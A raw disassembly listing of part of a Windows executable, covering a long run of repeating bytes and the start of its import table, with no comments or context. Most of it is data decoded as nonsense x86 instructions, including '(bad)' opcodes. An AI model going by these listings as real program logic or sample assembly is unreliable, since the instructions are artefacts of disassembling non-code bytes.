  407a2b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a2c:	68 64 3a 66 97       	push   $0x97663a64
  407a31:	41                   	inc    %ecx
  407a32:	02 b5 2a 64 aa f6    	add    -0x9559bd6(%ebp),%dh
  407a38:	68 64 3a 66 97       	push   $0x97663a64
  407a3d:	41                   	inc    %ecx
  407a3e:	06                   	push   %es
  407a3f:	b5 2a                	mov    $0x2a,%ch
  407a41:	64 aa                	fs stos %al,%es:(%edi)
  407a43:	f6 68 64             	imulb  0x64(%eax)
  407a46:	3a 66 97             	cmp    -0x69(%esi),%ah
  407a49:	41                   	inc    %ecx
  407a4a:	7a b5                	jp     0x407a01
  407a4c:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407a50:	68 64 3a 66 97       	push   $0x97663a64
  407a55:	41                   	inc    %ecx
  407a56:	7e b5                	jle    0x407a0d
  407a58:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407a5c:	68 64 3a 66 97       	push   $0x97663a64
  407a61:	41                   	inc    %ecx
  407a62:	72 b5                	jb     0x407a19
  407a64:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407a68:	68 64 3a 66 97       	push   $0x97663a64
  407a6d:	41                   	inc    %ecx
  407a6e:	76 b5                	jbe    0x407a25
  407a70:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407a74:	68 64 3a 66 97       	push   $0x97663a64
  407a79:	41                   	inc    %ecx
  407a7a:	6a b5                	push   $0xffffffb5
  407a7c:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407a80:	68 64 3a 66 97       	push   $0x97663a64
  407a85:	41                   	inc    %ecx
  407a86:	6e                   	outsb  %ds:(%esi),(%dx)
  407a87:	b5 2a                	mov    $0x2a,%ch
  407a89:	64 aa                	fs stos %al,%es:(%edi)
  407a8b:	f6 68 64             	imulb  0x64(%eax)
  407a8e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407a91:	41                   	inc    %ecx
  407a92:	62 b5 2a 64 aa f6    	bound  %esi,-0x9559bd6(%ebp)
  407a98:	68 64 3a 66 97       	push   $0x97663a64
  407a9d:	41                   	inc    %ecx
  407a9e:	66 b5 2a             	data16 mov $0x2a,%ch
  407aa1:	64 aa                	fs stos %al,%es:(%edi)
  407aa3:	f6 68 64             	imulb  0x64(%eax)
  407aa6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407aa9:	41                   	inc    %ecx
  407aaa:	5a                   	pop    %edx
  407aab:	b5 2a                	mov    $0x2a,%ch
  407aad:	64 aa                	fs stos %al,%es:(%edi)
  407aaf:	f6 68 64             	imulb  0x64(%eax)
  407ab2:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ab5:	41                   	inc    %ecx
  407ab6:	5e                   	pop    %esi
  407ab7:	b5 2a                	mov    $0x2a,%ch
  407ab9:	64 aa                	fs stos %al,%es:(%edi)
  407abb:	f6 68 64             	imulb  0x64(%eax)
  407abe:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ac1:	41                   	inc    %ecx
  407ac2:	52                   	push   %edx
  407ac3:	b5 2a                	mov    $0x2a,%ch
  407ac5:	64 aa                	fs stos %al,%es:(%edi)
  407ac7:	f6 68 64             	imulb  0x64(%eax)
  407aca:	3a 66 97             	cmp    -0x69(%esi),%ah
  407acd:	41                   	inc    %ecx
  407ace:	56                   	push   %esi
  407acf:	b5 2a                	mov    $0x2a,%ch
  407ad1:	64 aa                	fs stos %al,%es:(%edi)
  407ad3:	f6 68 64             	imulb  0x64(%eax)
  407ad6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ad9:	41                   	inc    %ecx
  407ada:	4a                   	dec    %edx
  407adb:	b5 2a                	mov    $0x2a,%ch
  407add:	64 aa                	fs stos %al,%es:(%edi)
  407adf:	f6 68 64             	imulb  0x64(%eax)
  407ae2:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ae5:	41                   	inc    %ecx
  407ae6:	4e                   	dec    %esi
  407ae7:	b5 2a                	mov    $0x2a,%ch
  407ae9:	64 aa                	fs stos %al,%es:(%edi)
  407aeb:	f6 68 64             	imulb  0x64(%eax)
  407aee:	3a 66 97             	cmp    -0x69(%esi),%ah
  407af1:	41                   	inc    %ecx
  407af2:	42                   	inc    %edx
  407af3:	b5 2a                	mov    $0x2a,%ch
  407af5:	64 aa                	fs stos %al,%es:(%edi)
  407af7:	f6 68 64             	imulb  0x64(%eax)
  407afa:	3a 66 97             	cmp    -0x69(%esi),%ah
  407afd:	41                   	inc    %ecx
  407afe:	46                   	inc    %esi
  407aff:	b5 2a                	mov    $0x2a,%ch
  407b01:	64 aa                	fs stos %al,%es:(%edi)
  407b03:	f6 68 64             	imulb  0x64(%eax)
  407b06:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b09:	41                   	inc    %ecx
  407b0a:	ba b5 2a 64 aa       	mov    $0xaa642ab5,%edx
  407b0f:	f6 68 64             	imulb  0x64(%eax)
  407b12:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b15:	41                   	inc    %ecx
  407b16:	be b5 2a 64 aa       	mov    $0xaa642ab5,%esi
  407b1b:	f6 68 64             	imulb  0x64(%eax)
  407b1e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b21:	41                   	inc    %ecx
  407b22:	b2 b5                	mov    $0xb5,%dl
  407b24:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407b28:	68 64 3a 66 97       	push   $0x97663a64
  407b2d:	41                   	inc    %ecx
  407b2e:	b6 b5                	mov    $0xb5,%dh
  407b30:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407b34:	68 64 3a 66 97       	push   $0x97663a64
  407b39:	41                   	inc    %ecx
  407b3a:	aa                   	stos   %al,%es:(%edi)
  407b3b:	b5 2a                	mov    $0x2a,%ch
  407b3d:	64 aa                	fs stos %al,%es:(%edi)
  407b3f:	f6 68 64             	imulb  0x64(%eax)
  407b42:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b45:	41                   	inc    %ecx
  407b46:	ae                   	scas   %es:(%edi),%al
  407b47:	b5 2a                	mov    $0x2a,%ch
  407b49:	64 aa                	fs stos %al,%es:(%edi)
  407b4b:	f6 68 64             	imulb  0x64(%eax)
  407b4e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b51:	41                   	inc    %ecx
  407b52:	a2 b5 2a 64 aa       	mov    %al,0xaa642ab5
  407b57:	f6 68 64             	imulb  0x64(%eax)
  407b5a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b5d:	41                   	inc    %ecx
  407b5e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407b5f:	b5 2a                	mov    $0x2a,%ch
  407b61:	64 aa                	fs stos %al,%es:(%edi)
  407b63:	f6 68 64             	imulb  0x64(%eax)
  407b66:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b69:	41                   	inc    %ecx
  407b6a:	9a b5 2a 64 aa f6 68 	lcall  $0x68f6,$0xaa642ab5
  407b71:	64 3a 66 97          	cmp    %fs:-0x69(%esi),%ah
  407b75:	41                   	inc    %ecx
  407b76:	9e                   	sahf
  407b77:	b5 2a                	mov    $0x2a,%ch
  407b79:	64 aa                	fs stos %al,%es:(%edi)
  407b7b:	f6 68 64             	imulb  0x64(%eax)
  407b7e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b81:	41                   	inc    %ecx
  407b82:	92                   	xchg   %eax,%edx
  407b83:	b5 2a                	mov    $0x2a,%ch
  407b85:	64 aa                	fs stos %al,%es:(%edi)
  407b87:	f6 68 64             	imulb  0x64(%eax)
  407b8a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b8d:	41                   	inc    %ecx
  407b8e:	96                   	xchg   %eax,%esi
  407b8f:	b5 2a                	mov    $0x2a,%ch
  407b91:	64 aa                	fs stos %al,%es:(%edi)
  407b93:	f6 68 64             	imulb  0x64(%eax)
  407b96:	3a 66 97             	cmp    -0x69(%esi),%ah
  407b99:	41                   	inc    %ecx
  407b9a:	8a b5 2a 64 aa f6    	mov    -0x9559bd6(%ebp),%dh
  407ba0:	68 64 3a 66 97       	push   $0x97663a64
  407ba5:	41                   	inc    %ecx
  407ba6:	8e b5 2a 64 aa f6    	mov    -0x9559bd6(%ebp),%?
  407bac:	68 64 3a 66 97       	push   $0x97663a64
  407bb1:	41                   	inc    %ecx
  407bb2:	82 b5 2a 64 aa f6 68 	xorb   $0x68,-0x9559bd6(%ebp)
  407bb9:	64 3a 66 97          	cmp    %fs:-0x69(%esi),%ah
  407bbd:	41                   	inc    %ecx
  407bbe:	86 b5 2a 64 aa f6    	xchg   %dh,-0x9559bd6(%ebp)
  407bc4:	68 64 3a 66 97       	push   $0x97663a64
  407bc9:	41                   	inc    %ecx
  407bca:	fa                   	cli
  407bcb:	b5 2a                	mov    $0x2a,%ch
  407bcd:	64 aa                	fs stos %al,%es:(%edi)
  407bcf:	f6 68 64             	imulb  0x64(%eax)
  407bd2:	3a 66 97             	cmp    -0x69(%esi),%ah
  407bd5:	41                   	inc    %ecx
  407bd6:	fe                   	(bad)
  407bd7:	b5 2a                	mov    $0x2a,%ch
  407bd9:	64 aa                	fs stos %al,%es:(%edi)
  407bdb:	f6 68 64             	imulb  0x64(%eax)
  407bde:	3a 66 97             	cmp    -0x69(%esi),%ah
  407be1:	41                   	inc    %ecx
  407be2:	f2 b5 2a             	repnz mov $0x2a,%ch
  407be5:	64 aa                	fs stos %al,%es:(%edi)
  407be7:	f6 68 64             	imulb  0x64(%eax)
  407bea:	3a 66 97             	cmp    -0x69(%esi),%ah
  407bed:	41                   	inc    %ecx
  407bee:	f6 b5 2a 64 aa f6    	divb   -0x9559bd6(%ebp)
  407bf4:	68 64 3a 66 97       	push   $0x97663a64
  407bf9:	41                   	inc    %ecx
  407bfa:	ea b5 2a 64 aa f6 68 	ljmp   $0x68f6,$0xaa642ab5
  407c01:	64 3a 66 97          	cmp    %fs:-0x69(%esi),%ah
  407c05:	41                   	inc    %ecx
  407c06:	ee                   	out    %al,(%dx)
  407c07:	b5 2a                	mov    $0x2a,%ch
  407c09:	64 aa                	fs stos %al,%es:(%edi)
  407c0b:	f6 68 64             	imulb  0x64(%eax)
  407c0e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c11:	41                   	inc    %ecx
  407c12:	e2 b5                	loop   0x407bc9
  407c14:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407c18:	68 64 3a 66 97       	push   $0x97663a64
  407c1d:	41                   	inc    %ecx
  407c1e:	e6 b5                	out    %al,$0xb5
  407c20:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407c24:	68 64 3a 66 97       	push   $0x97663a64
  407c29:	41                   	inc    %ecx
  407c2a:	da b5 2a 64 aa f6    	fidivl -0x9559bd6(%ebp)
  407c30:	68 64 3a 66 97       	push   $0x97663a64
  407c35:	41                   	inc    %ecx
  407c36:	d6                   	salc
  407c37:	b5 2a                	mov    $0x2a,%ch
  407c39:	64 aa                	fs stos %al,%es:(%edi)
  407c3b:	f6 68 64             	imulb  0x64(%eax)
  407c3e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c41:	41                   	inc    %ecx
  407c42:	ca b5 2a             	lret   $0x2ab5
  407c45:	64 aa                	fs stos %al,%es:(%edi)
  407c47:	f6 68 64             	imulb  0x64(%eax)
  407c4a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c4d:	41                   	inc    %ecx
  407c4e:	ce                   	into
  407c4f:	b5 2a                	mov    $0x2a,%ch
  407c51:	64 aa                	fs stos %al,%es:(%edi)
  407c53:	f6 68 64             	imulb  0x64(%eax)
  407c56:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c59:	41                   	inc    %ecx
  407c5a:	c2 b5 2a             	ret    $0x2ab5
  407c5d:	64 aa                	fs stos %al,%es:(%edi)
  407c5f:	f6 68 64             	imulb  0x64(%eax)
  407c62:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c65:	41                   	inc    %ecx
  407c66:	c6                   	(bad)
  407c67:	b5 2a                	mov    $0x2a,%ch
  407c69:	64 aa                	fs stos %al,%es:(%edi)
  407c6b:	f6 68 64             	imulb  0x64(%eax)
  407c6e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c71:	41                   	inc    %ecx
  407c72:	3a b2 2a 64 aa f6    	cmp    -0x9559bd6(%edx),%dh
  407c78:	68 64 3a 66 97       	push   $0x97663a64
  407c7d:	41                   	inc    %ecx
  407c7e:	3e b2 2a             	ds mov $0x2a,%dl
  407c81:	64 aa                	fs stos %al,%es:(%edi)
  407c83:	f6 68 64             	imulb  0x64(%eax)
  407c86:	3a 66 97             	cmp    -0x69(%esi),%ah
  407c89:	41                   	inc    %ecx
  407c8a:	32 b2 2a 64 aa f6    	xor    -0x9559bd6(%edx),%dh
  407c90:	68 64 3a 66 97       	push   $0x97663a64
  407c95:	41                   	inc    %ecx
  407c96:	36 b2 2a             	ss mov $0x2a,%dl
  407c99:	64 aa                	fs stos %al,%es:(%edi)
  407c9b:	f6 68 64             	imulb  0x64(%eax)
  407c9e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ca1:	41                   	inc    %ecx
  407ca2:	2a b2 2a 64 aa f6    	sub    -0x9559bd6(%edx),%dh
  407ca8:	68 64 3a 66 97       	push   $0x97663a64
  407cad:	41                   	inc    %ecx
  407cae:	2e b2 2a             	cs mov $0x2a,%dl
  407cb1:	64 aa                	fs stos %al,%es:(%edi)
  407cb3:	f6 68 64             	imulb  0x64(%eax)
  407cb6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407cb9:	41                   	inc    %ecx
  407cba:	22 b2 2a 64 aa f6    	and    -0x9559bd6(%edx),%dh
  407cc0:	68 64 3a 66 97       	push   $0x97663a64
  407cc5:	41                   	inc    %ecx
  407cc6:	26 b2 2a             	es mov $0x2a,%dl
  407cc9:	64 aa                	fs stos %al,%es:(%edi)
  407ccb:	f6 68 64             	imulb  0x64(%eax)
  407cce:	3a 66 97             	cmp    -0x69(%esi),%ah
  407cd1:	41                   	inc    %ecx
  407cd2:	1a b2 2a 64 aa f6    	sbb    -0x9559bd6(%edx),%dh
  407cd8:	68 64 3a 66 97       	push   $0x97663a64
  407cdd:	41                   	inc    %ecx
  407cde:	1e                   	push   %ds
  407cdf:	b2 2a                	mov    $0x2a,%dl
  407ce1:	64 aa                	fs stos %al,%es:(%edi)
  407ce3:	f6 68 64             	imulb  0x64(%eax)
  407ce6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407ce9:	41                   	inc    %ecx
  407cea:	12 b2 2a 64 aa f6    	adc    -0x9559bd6(%edx),%dh
  407cf0:	68 64 3a 66 97       	push   $0x97663a64
  407cf5:	41                   	inc    %ecx
  407cf6:	16                   	push   %ss
  407cf7:	b2 2a                	mov    $0x2a,%dl
  407cf9:	64 aa                	fs stos %al,%es:(%edi)
  407cfb:	f6 68 64             	imulb  0x64(%eax)
  407cfe:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d01:	41                   	inc    %ecx
  407d02:	0a b2 2a 64 aa f6    	or     -0x9559bd6(%edx),%dh
  407d08:	68 64 3a 66 97       	push   $0x97663a64
  407d0d:	41                   	inc    %ecx
  407d0e:	0e                   	push   %cs
  407d0f:	b2 2a                	mov    $0x2a,%dl
  407d11:	64 aa                	fs stos %al,%es:(%edi)
  407d13:	f6 68 64             	imulb  0x64(%eax)
  407d16:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d19:	41                   	inc    %ecx
  407d1a:	02 b2 2a 64 aa f6    	add    -0x9559bd6(%edx),%dh
  407d20:	68 64 3a 66 97       	push   $0x97663a64
  407d25:	41                   	inc    %ecx
  407d26:	06                   	push   %es
  407d27:	b2 2a                	mov    $0x2a,%dl
  407d29:	64 aa                	fs stos %al,%es:(%edi)
  407d2b:	f6 68 64             	imulb  0x64(%eax)
  407d2e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d31:	41                   	inc    %ecx
  407d32:	7a b2                	jp     0x407ce6
  407d34:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407d38:	68 64 3a 66 97       	push   $0x97663a64
  407d3d:	41                   	inc    %ecx
  407d3e:	7e b2                	jle    0x407cf2
  407d40:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407d44:	68 64 3a 66 97       	push   $0x97663a64
  407d49:	41                   	inc    %ecx
  407d4a:	72 b2                	jb     0x407cfe
  407d4c:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407d50:	68 64 3a 66 97       	push   $0x97663a64
  407d55:	41                   	inc    %ecx
  407d56:	76 b2                	jbe    0x407d0a
  407d58:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407d5c:	68 64 3a 66 97       	push   $0x97663a64
  407d61:	41                   	inc    %ecx
  407d62:	6a b2                	push   $0xffffffb2
  407d64:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407d68:	68 64 3a 66 97       	push   $0x97663a64
  407d6d:	41                   	inc    %ecx
  407d6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d6f:	b2 2a                	mov    $0x2a,%dl
  407d71:	64 aa                	fs stos %al,%es:(%edi)
  407d73:	f6 68 64             	imulb  0x64(%eax)
  407d76:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d79:	41                   	inc    %ecx
  407d7a:	62 b2 2a 64 aa f6    	bound  %esi,-0x9559bd6(%edx)
  407d80:	68 64 3a 66 97       	push   $0x97663a64
  407d85:	41                   	inc    %ecx
  407d86:	5e                   	pop    %esi
  407d87:	b2 2a                	mov    $0x2a,%dl
  407d89:	64 aa                	fs stos %al,%es:(%edi)
  407d8b:	f6 68 64             	imulb  0x64(%eax)
  407d8e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d91:	41                   	inc    %ecx
  407d92:	52                   	push   %edx
  407d93:	b2 2a                	mov    $0x2a,%dl
  407d95:	64 aa                	fs stos %al,%es:(%edi)
  407d97:	f6 68 64             	imulb  0x64(%eax)
  407d9a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407d9d:	41                   	inc    %ecx
  407d9e:	56                   	push   %esi
  407d9f:	b2 2a                	mov    $0x2a,%dl
  407da1:	64 aa                	fs stos %al,%es:(%edi)
  407da3:	f6 68 64             	imulb  0x64(%eax)
  407da6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407da9:	41                   	inc    %ecx
  407daa:	4a                   	dec    %edx
  407dab:	b2 2a                	mov    $0x2a,%dl
  407dad:	64 aa                	fs stos %al,%es:(%edi)
  407daf:	f6 68 64             	imulb  0x64(%eax)
  407db2:	3a 66 97             	cmp    -0x69(%esi),%ah
  407db5:	41                   	inc    %ecx
  407db6:	4e                   	dec    %esi
  407db7:	b2 2a                	mov    $0x2a,%dl
  407db9:	64 aa                	fs stos %al,%es:(%edi)
  407dbb:	f6 68 64             	imulb  0x64(%eax)
  407dbe:	3a 66 97             	cmp    -0x69(%esi),%ah
  407dc1:	41                   	inc    %ecx
  407dc2:	ba b2 2a 64 aa       	mov    $0xaa642ab2,%edx
  407dc7:	f6 68 64             	imulb  0x64(%eax)
  407dca:	3a 66 97             	cmp    -0x69(%esi),%ah
  407dcd:	41                   	inc    %ecx
  407dce:	be b2 2a 64 aa       	mov    $0xaa642ab2,%esi
  407dd3:	f6 68 64             	imulb  0x64(%eax)
  407dd6:	3a 66 97             	cmp    -0x69(%esi),%ah
  407dd9:	41                   	inc    %ecx
  407dda:	b2 b2                	mov    $0xb2,%dl
  407ddc:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407de0:	68 64 3a 66 97       	push   $0x97663a64
  407de5:	41                   	inc    %ecx
  407de6:	b6 b2                	mov    $0xb2,%dh
  407de8:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407dec:	68 64 3a 66 97       	push   $0x97663a64
  407df1:	41                   	inc    %ecx
  407df2:	aa                   	stos   %al,%es:(%edi)
  407df3:	b2 2a                	mov    $0x2a,%dl
  407df5:	64 aa                	fs stos %al,%es:(%edi)
  407df7:	f6 68 64             	imulb  0x64(%eax)
  407dfa:	3a 66 97             	cmp    -0x69(%esi),%ah
  407dfd:	41                   	inc    %ecx
  407dfe:	ae                   	scas   %es:(%edi),%al
  407dff:	b2 2a                	mov    $0x2a,%dl
  407e01:	64 aa                	fs stos %al,%es:(%edi)
  407e03:	f6 68 64             	imulb  0x64(%eax)
  407e06:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e09:	41                   	inc    %ecx
  407e0a:	a2 b2 2a 64 aa       	mov    %al,0xaa642ab2
  407e0f:	f6 68 64             	imulb  0x64(%eax)
  407e12:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e15:	41                   	inc    %ecx
  407e16:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407e17:	b2 2a                	mov    $0x2a,%dl
  407e19:	64 aa                	fs stos %al,%es:(%edi)
  407e1b:	f6 68 64             	imulb  0x64(%eax)
  407e1e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e21:	41                   	inc    %ecx
  407e22:	92                   	xchg   %eax,%edx
  407e23:	b2 2a                	mov    $0x2a,%dl
  407e25:	64 aa                	fs stos %al,%es:(%edi)
  407e27:	f6 68 64             	imulb  0x64(%eax)
  407e2a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e2d:	41                   	inc    %ecx
  407e2e:	96                   	xchg   %eax,%esi
  407e2f:	b2 2a                	mov    $0x2a,%dl
  407e31:	64 aa                	fs stos %al,%es:(%edi)
  407e33:	f6 68 64             	imulb  0x64(%eax)
  407e36:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e39:	41                   	inc    %ecx
  407e3a:	8a b2 2a 64 aa f6    	mov    -0x9559bd6(%edx),%dh
  407e40:	68 64 3a 66 97       	push   $0x97663a64
  407e45:	41                   	inc    %ecx
  407e46:	8e b2 2a 64 aa f6    	mov    -0x9559bd6(%edx),%?
  407e4c:	68 64 3a 66 97       	push   $0x97663a64
  407e51:	41                   	inc    %ecx
  407e52:	82 b2 2a 64 aa f6 68 	xorb   $0x68,-0x9559bd6(%edx)
  407e59:	64 3a 66 97          	cmp    %fs:-0x69(%esi),%ah
  407e5d:	41                   	inc    %ecx
  407e5e:	86 b2 2a 64 aa f6    	xchg   %dh,-0x9559bd6(%edx)
  407e64:	68 64 3a 66 97       	push   $0x97663a64
  407e69:	41                   	inc    %ecx
  407e6a:	fa                   	cli
  407e6b:	b2 2a                	mov    $0x2a,%dl
  407e6d:	64 aa                	fs stos %al,%es:(%edi)
  407e6f:	f6 68 64             	imulb  0x64(%eax)
  407e72:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e75:	41                   	inc    %ecx
  407e76:	fe                   	(bad)
  407e77:	b2 2a                	mov    $0x2a,%dl
  407e79:	64 aa                	fs stos %al,%es:(%edi)
  407e7b:	f6 68 64             	imulb  0x64(%eax)
  407e7e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e81:	41                   	inc    %ecx
  407e82:	f2 b2 2a             	repnz mov $0x2a,%dl
  407e85:	64 aa                	fs stos %al,%es:(%edi)
  407e87:	f6 68 64             	imulb  0x64(%eax)
  407e8a:	3a 66 97             	cmp    -0x69(%esi),%ah
  407e8d:	41                   	inc    %ecx
  407e8e:	f6 b2 2a 64 aa f6    	divb   -0x9559bd6(%edx)
  407e94:	68 64 3a 66 97       	push   $0x97663a64
  407e99:	41                   	inc    %ecx
  407e9a:	ea b2 2a 64 aa f6 68 	ljmp   $0x68f6,$0xaa642ab2
  407ea1:	64 3a 66 97          	cmp    %fs:-0x69(%esi),%ah
  407ea5:	41                   	inc    %ecx
  407ea6:	ee                   	out    %al,(%dx)
  407ea7:	b2 2a                	mov    $0x2a,%dl
  407ea9:	64 aa                	fs stos %al,%es:(%edi)
  407eab:	f6 68 64             	imulb  0x64(%eax)
  407eae:	3a 66 97             	cmp    -0x69(%esi),%ah
  407eb1:	41                   	inc    %ecx
  407eb2:	e2 b2                	loop   0x407e66
  407eb4:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407eb8:	68 64 3a 66 97       	push   $0x97663a64
  407ebd:	41                   	inc    %ecx
  407ebe:	e6 b2                	out    %al,$0xb2
  407ec0:	2a 64 aa f6          	sub    -0xa(%edx,%ebp,4),%ah
  407ec4:	68 64 3a 66 97       	push   $0x97663a64
  407ec9:	41                   	inc    %ecx
  407eca:	da b2 2a 64 aa f6    	fidivl -0x9559bd6(%edx)
  407ed0:	68 64 3a 66 97       	push   $0x97663a64
  407ed5:	41                   	inc    %ecx
  407ed6:	de b2 2a 64 aa f6    	fidivs -0x9559bd6(%edx)
  407edc:	68 64 3a 66 97       	push   $0x97663a64
  407ee1:	41                   	inc    %ecx
  407ee2:	d2 b2 2a 64 aa f6    	shlb   %cl,-0x9559bd6(%edx)
  407ee8:	68 64 3a 66 97       	push   $0x97663a64
  407eed:	41                   	inc    %ecx
  407eee:	d6                   	salc
  407eef:	b2 2a                	mov    $0x2a,%dl
  407ef1:	64 aa                	fs stos %al,%es:(%edi)
  407ef3:	f6 68 64             	imulb  0x64(%eax)
  407ef6:	3a                   	.byte 0x3a
  407ef7:	66                   	data16

Disassembly of section .idata:

0042d000 <.idata>:
  42d000:	08 d1                	or     %dl,%cl
  42d002:	02 00                	add    (%eax),%al
	...
  42d00c:	44                   	inc    %esp
  42d00d:	dc 02                	faddl  (%edx)
  42d00f:	00 00                	add    %al,(%eax)
  42d011:	d3 02                	roll   %cl,(%edx)
  42d013:	00 20                	add    %ah,(%eax)
  42d015:	d1 02                	roll   $1,(%edx)
	...
  42d01f:	00 60 dc             	add    %ah,-0x24(%eax)
  42d022:	02 00                	add    (%eax),%al
  42d024:	18 d3                	sbb    %dl,%bl
  42d026:	02 00                	add    (%eax),%al
  42d028:	2c d1                	sub    $0xd1,%al
  42d02a:	02 00                	add    (%eax),%al
	...
  42d034:	74 dc                	je     0x42d012
  42d036:	02 00                	add    (%eax),%al
  42d038:	24 d3                	and    $0xd3,%al
  42d03a:	02 00                	add    (%eax),%al
  42d03c:	40                   	inc    %eax
  42d03d:	d1 02                	roll   $1,(%edx)
	...
  42d047:	00 8c dc 02 00 38 d3 	add    %cl,-0x2cc7fffe(%esp,%ebx,8)
  42d04e:	02 00                	add    (%eax),%al
  42d050:	f4                   	hlt
  42d051:	d1 02                	roll   $1,(%edx)
	...
  42d05b:	00 48 dd             	add    %cl,-0x23(%eax)
  42d05e:	02 00                	add    (%eax),%al
  42d060:	ec                   	in     (%dx),%al
  42d061:	d3 02                	roll   %cl,(%edx)
  42d063:	00 6c d2 02          	add    %ch,0x2(%edx,%edx,8)
	...
  42d06f:	00 c4                	add    %al,%ah
  42d071:	dd 02                	fldl   (%edx)
  42d073:	00 64 d4 02          	add    %ah,0x2(%esp,%edx,8)
  42d077:	00 88 d2 02 00 00    	add    %cl,0x2d2(%eax)
  42d07d:	00 00                	add    %al,(%eax)
  42d07f:	00 00                	add    %al,(%eax)
  42d081:	00 00                	add    %al,(%eax)
  42d083:	00 e4                	add    %ah,%ah
  42d085:	dd 02                	fldl   (%edx)
  42d087:	00 80 d4 02 00 b0    	add    %al,-0x4ffffd2c(%eax)
  42d08d:	d2 02                	rolb   %cl,(%edx)
	...
  42d097:	00 14 de             	add    %dl,(%esi,%ebx,8)
  42d09a:	02 00                	add    (%eax),%al
  42d09c:	a8 d4                	test   $0xd4,%al
  42d09e:	02 00                	add    (%eax),%al
	...
  42d108:	f4                   	hlt
  42d109:	d4 02                	aam    $0x2
  42d10b:	00 08                	add    %cl,(%eax)
  42d10d:	d5 02                	aad    $0x2
  42d10f:	00 1c d5 02 00 2c d5 	add    %bl,-0x2ad3fffe(,%edx,8)
  42d116:	02 00                	add    (%eax),%al
	...
  42d120:	40                   	inc    %eax
  42d121:	d5 02                	aad    $0x2
	...
  42d12b:	00 54 d5 02          	add    %dl,0x2(%ebp,%edx,8)
  42d12f:	00 6c d5 02          	add    %ch,0x2(%ebp,%edx,8)
  42d133:	00 88 d5 02 00 00    	add    %cl,0x2d5(%eax)
  42d139:	00 00                	add    %al,(%eax)
  42d13b:	00 00                	add    %al,(%eax)
  42d13d:	00 00                	add    %al,(%eax)
  42d13f:	00 a4 d5 02 00 b4 d5 	add    %ah,-0x2a4bfffe(%ebp,%edx,8)
  42d146:	02 00                	add    (%eax),%al
  42d148:	d0 d5                	rcl    $1,%ch
  42d14a:	02 00                	add    (%eax),%al
  42d14c:	e4 d5                	in     $0xd5,%al
  42d14e:	02 00                	add    (%eax),%al
  42d150:	fc                   	cld
  42d151:	d5 02                	aad    $0x2
  42d153:	00 14 d6             	add    %dl,(%esi,%edx,8)
  42d156:	02 00                	add    (%eax),%al
  42d158:	28 d6                	sub    %dl,%dh
  42d15a:	02 00                	add    (%eax),%al
  42d15c:	38 d6                	cmp    %dl,%dh
  42d15e:	02 00                	add    (%eax),%al
  42d160:	50                   	push   %eax
  42d161:	d6                   	salc
  42d162:	02 00                	add    (%eax),%al
  42d164:	64 d6                	fs salc
  42d166:	02 00                	add    (%eax),%al
  42d168:	74 d6                	je     0x42d140
  42d16a:	02 00                	add    (%eax),%al
  42d16c:	88 d6                	mov    %dl,%dh
  42d16e:	02 00                	add    (%eax),%al
  42d170:	a0 d6 02 00 b0       	mov    0xb00002d6,%al
  42d175:	d6                   	salc
  42d176:	02 00                	add    (%eax),%al
  42d178:	c0 d6 02             	rcl    $0x2,%dh
  42d17b:	00 d0                	add    %dl,%al
  42d17d:	d6                   	salc
  42d17e:	02 00                	add    (%eax),%al
  42d180:	e0 d6                	loopne 0x42d158
